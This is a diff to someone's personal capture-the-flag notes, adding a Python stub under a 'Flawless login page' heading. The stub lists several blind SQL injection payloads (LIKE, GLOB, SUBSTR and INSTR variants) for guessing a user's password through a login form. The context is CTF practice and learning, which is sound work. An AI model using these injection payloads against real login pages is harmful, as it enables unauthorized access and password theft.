@@ -59,4 +59,12 @@ From there, we are able to get the source code of the app, revealing the flag ha
 
 # Post ctf lessons
 ## Flawless login page
+#langs/python , #langs/sql 
 TODO Sql oracle attack didn't work???? Put the various payloads I tried here
+```python
+def fetch(pw):
+    # body = {"username": "Jacob", "password": f"' or password like '{pw}%';--"}
+    # body = {"username": "Jacob", "password": f"' or password glob '{pw}*';--"}
+    # body = {"username": "Jacob", "password": f"' or substr(password, 1, {len(pw)}) glob '{pw}';--"} # idk case-sensitive search
+    body = {"username": "Jacob", "password": f"' or instr(password, '{pw}') = 1;--"} # Works best? Just remember to remove forbidden chars like '
+```
